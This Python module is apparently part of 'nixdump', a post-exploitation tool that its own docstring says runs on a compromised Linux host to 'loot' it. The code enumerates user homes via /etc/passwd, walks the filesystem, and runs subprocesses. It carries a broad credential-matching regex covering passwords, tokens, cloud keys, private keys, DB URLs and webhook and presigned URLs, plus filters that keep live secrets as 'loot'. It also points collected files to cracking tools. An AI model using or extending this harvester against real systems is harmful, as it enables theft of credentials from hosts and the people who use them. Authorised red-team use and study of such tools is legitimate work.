"""Subprocess + filesystem helpers for local looting.

Design: nixdump runs ON a compromised Linux host (ideally as root) and reads the
filesystem directly. Every read is wrapped so a missing/unreadable file never
crashes a collector - a looter must keep going and grab what it can.
"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
from dataclasses import dataclass
from typing import Iterable, List, Optional, Tuple

_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")

# When looting offline from a collected bundle, every absolute target path is
# read from under this root instead of the live filesystem. Live mode = "".
ROOT = ""


def set_root(path: str) -> None:
    global ROOT
    ROOT = path.rstrip("/") if path else ""


def _real(p: str) -> str:
    """Logical (target-absolute) path -> real path on this disk."""
    if ROOT and p.startswith("/"):
        return ROOT + p
    return p


def _logical(p: str) -> str:
    """Real path on disk -> logical (target-absolute) path for display/re-read."""
    if ROOT and p.startswith(ROOT):
        return p[len(ROOT):] or "/"
    return p


def strip_ansi(s: str) -> str:
    return _ANSI_RE.sub("", s).replace("\x00", "")


def is_root() -> bool:
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


def which(name: str) -> Optional[str]:
    return shutil.which(name)


def read_text(path: str, max_bytes: int = 512 * 1024) -> Optional[str]:
    """Read a file as text, capped. Returns None if unreadable."""
    try:
        with open(_real(path), "rb") as fh:
            data = fh.read(max_bytes + 1)
        return data.decode("utf-8", errors="ignore")
    except OSError:
        return None


def read_bytes(path: str, max_bytes: int = 4 * 1024 * 1024) -> Optional[bytes]:
    try:
        with open(_real(path), "rb") as fh:
            return fh.read(max_bytes)
    except OSError:
        return None


def realpath(path: str) -> str:
    """Public: map a logical target path to the real on-disk path. Use when
    handing a collected file to an external tool (john, ssh2john, firefox_decrypt)."""
    return _real(path)


def exists(path: str) -> bool:
    return os.path.exists(_real(path))


def isdir(path: str) -> bool:
    return os.path.isdir(_real(path))


def home_dirs() -> List[str]:
    """Every real user home + /root (what we can see). Root sees all; a normal
    user usually only their own, but we try all and let reads fail gracefully."""
    homes = set()
    if os.path.isdir(_real("/root")):
        homes.add("/root")
    for base in ("/home",):
        try:
            for name in os.listdir(_real(base)):
                p = os.path.join(base, name)
                if os.path.isdir(_real(p)):
                    homes.add(p)
        except OSError:
            pass
    # also parse /etc/passwd for non-standard home dirs
    pw = read_text("/etc/passwd")
    if pw:
        for line in pw.splitlines():
            parts = line.split(":")
            if len(parts) >= 6 and parts[5].startswith("/") and os.path.isdir(_real(parts[5])):
                homes.add(parts[5])
    return sorted(homes)


def user_of_home(path: str) -> str:
    """Best-effort: username from a home path (/home/mark -> mark, /root -> root)."""
    p = path.rstrip("/")
    if p == "/root":
        return "root"
    return os.path.basename(p)


def find_files(roots: Iterable[str], name_regex: re.Pattern, max_depth: int = 6,
               max_hits: int = 5000, follow_symlinks: bool = False) -> List[str]:
    """Walk roots, return files whose BASENAME matches name_regex. Depth-limited
    and capped so it can't run away on a huge filesystem."""
    hits: List[str] = []
    for root in roots:
        rroot = _real(root)
        if not os.path.isdir(rroot):
            continue
        base_depth = rroot.rstrip("/").count("/")
        for dirpath, dirnames, filenames in os.walk(rroot, followlinks=follow_symlinks):
            depth = dirpath.rstrip("/").count("/") - base_depth
            if depth >= max_depth:
                dirnames[:] = []
            # skip noisy pseudo/irrelevant trees
            dirnames[:] = [d for d in dirnames if d not in
                           ("proc", "sys", "dev", "snap", "node_modules",
                            ".cache", "__pycache__")]
            for fn in filenames:
                if name_regex.search(fn):
                    hits.append(_logical(os.path.join(dirpath, fn)))
                    if len(hits) >= max_hits:
                        return hits
    return hits


@dataclass
class CmdResult:
    cmd: List[str]
    rc: int
    stdout: str
    stderr: str
    timed_out: bool = False

    @property
    def output(self) -> str:
        return self.stdout + ("\n" + self.stderr if self.stderr else "")


def run(cmd: List[str], timeout: int = 300, input_text: Optional[str] = None) -> CmdResult:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                              input=input_text, errors="ignore")
        return CmdResult(cmd, proc.returncode, proc.stdout or "", proc.stderr or "")
    except subprocess.TimeoutExpired as e:
        return CmdResult(cmd, -1,
                         e.stdout if isinstance(e.stdout, str) else "",
                         e.stderr if isinstance(e.stderr, str) else "",
                         timed_out=True)
    except FileNotFoundError:
        return CmdResult(cmd, 127, "", "binary not found")


# keyword regex shared by several collectors for grepping config/history files
CRED_KW = re.compile(
    r"(pass(word|wd|phrase)?|pwd|secret|api[_-]?key|token|bearer|"
    r"connection[_-]?string|conn[_-]?str|data source|initial catalog|"
    r"aws_secret|aws_access|client_secret|private[_-]?key|credential|"
    r"db_pass|db_user|smtp_pass|redis.*auth|mongodb(\+srv)?://|mysql://|"
    r"postgres(ql)?://|amqp://|ftp://[^\s]*:[^\s]*@|://[^\s/]*:[^\s/@]+@|"
    r"BEGIN [A-Z ]*PRIVATE KEY|-----BEGIN|define\(['\"]DB_|pwd=|passwd=)",
    re.I)


# --- noise filtering --------------------------------------------------------
# Decide whether a KEY=VALUE finding (process env / config) is real loot or just
# config scaffolding, code, a path or a placeholder. Conservative: a value is
# only dropped when it provably cannot be a live credential, so real secrets are
# never filtered. When the key NAME itself says "secret" (password/token/key/...)
# the path/number heuristics are skipped - a real password may look like either.

# env-var / config-key NAMES that are never secrets (exact match, lowercased)
BENIGN_NAMES = {
    "pwd", "oldpwd", "shlvl", "path", "home", "user", "logname", "term",
    "lang", "mail", "shell", "hostname", "tz", "editor", "pager", "colorterm",
    "ssh_connection", "ssh_client", "ssh_tty", "ssh_auth_sock",
    "xdg_runtime_dir", "xdg_session_id", "xdg_session_type",
    "xdg_session_class", "xdg_data_dirs", "xdg_config_dirs", "xdg_seat",
    "xdg_vtnr", "dbus_session_bus_address", "ls_colors",
    "systemd_nss_bypass_bus", "systemd_exec_pid", "invocation_id",
    "journal_stream", "managerpid", "notify_socket", "listen_pid",
    "listen_fds", "runlevel", "previous", "_",
}

_TEMPLATE_RE = re.compile(r"\{\{|\}\}|\$\{|%\(|%s\b|<[a-zA-Z_]+>")
_NULLISH = {
    "", "none", "null", "nil", "true", "false", "changeme", "change_me",
    "yourpassword", "your_password", "example", "placeholder", "redacted",
}
_HARDWORDS = {"pass", "passwd", "password", "pwd", "secret", "token", "apikey",
              "credential", "credentials", "passphrase", "privatekey"}
_URLWORDS = {"uri", "uris", "endpoint", "endpoints", "href", "dsn"}
_URL_CREDS_RE = re.compile(r"://[^/@\s]*:[^/@\s]+@")   # scheme://[user]:pass@host

# Secrets that live in a URL path or query string, not in a user:pass@ part:
# slack/discord/teams webhooks, presigned S3 / Azure SAS, ?api_key=/&token=/&sig=
_URL_WEBHOOK_RE = re.compile(
    r"https://hooks\.slack\.com/services/[A-Z0-9/]+"
    r"|https://discord(?:app)?\.com/api/webhooks/\d+/[\w-]+"
    r"|https://[\w.-]*\.webhook\.office\.com/[\w/-]+", re.I)
_URL_PRESIGNED_RE = re.compile(
    r"[?&](?:X-Amz-Signature|X-Amz-Credential|sig|sv)=", re.I)
_URL_QUERY_SECRET_RE = re.compile(
    r"[?&](?:api[_-]?key|apikey|access[_-]?key|secret|token|auth|sig|signature"
    r"|x-amz-signature|x-amz-credential|sas|code|password|passwd|pwd)"
    r"=([^&\s'\"]{8,})", re.I)


def url_has_secret(value: str) -> bool:
    """True if a URL carries a secret in its path/query (not just user:pass@)."""
    if not value or "://" not in value:
        return False
    v = value.strip().strip("'\"")
    return bool(_URL_WEBHOOK_RE.search(v) or _URL_PRESIGNED_RE.search(v)
                or _URL_QUERY_SECRET_RE.search(v))


def url_secret_kind(value: str) -> str:
    v = (value or "").strip().strip("'\"")
    if _URL_WEBHOOK_RE.search(v):
        return "webhook-url"
    if _URL_PRESIGNED_RE.search(v):
        return "presigned-url"
    if _URL_QUERY_SECRET_RE.search(v):
        return "url-query-secret"
    return "url-secret"


def is_benign_name(name: str) -> bool:
    return (name or "").strip().lower() in BENIGN_NAMES


def _name_is_secretish(name: str) -> bool:
    for seg in re.split(r"[^a-z0-9]+", (name or "").lower()):
        if (seg in _HARDWORDS or seg.startswith("passw") or seg.startswith("secret")
                or seg.startswith("token") or seg.startswith("apikey")):
            return True
    return False


def _name_is_urlish(name: str) -> bool:
    for seg in re.split(r"[^a-z0-9]+", (name or "").lower()):
        if seg in _URLWORDS or seg.startswith("url"):
            return True
    return False


def is_nonsecret_value(value: str, hard: bool = False) -> bool:
    """True = structurally not a secret. With hard=True (key name already means
    'secret') only template/null/code is rejected - never path/number, because a
    real password may legitimately look like those."""
    v = (value or "").strip().strip("'\"")
    if v.lower() in _NULLISH:
        return True
    if _TEMPLATE_RE.search(v):                      # {{x}} ${x} %s %(x)s <pass>
        return True
    if (v.startswith("(") or v.endswith("(") or v.startswith("[")
            or "import " in v or "()" in v):
        return True                                 # code: get_config(  X=(
    if hard:
        return False
    if v.startswith("/") and "://" not in v and "@" not in v:
        return True                                 # bare filesystem path
    if re.fullmatch(r"[-+]?\d+", v):                # pure integer / flag value
        return True
    return False


def env_pair_is_junk(name: str, value: str) -> bool:
    """Unified gate for KEY=VALUE findings. True = drop (not loot)."""
    if is_benign_name(name):
        return True
    hard = _name_is_secretish(name)
    if is_nonsecret_value(value, hard=hard):
        return True
    # *_URL / *_URI / *_DSN: only loot when the value embeds credentials -
    # either user:pass@ or a secret in the path/query (webhook, presigned, ?api_key=)
    if (not hard and _name_is_urlish(name)
            and not _URL_CREDS_RE.search(value or "")
            and not url_has_secret(value or "")):
        return True
    return False
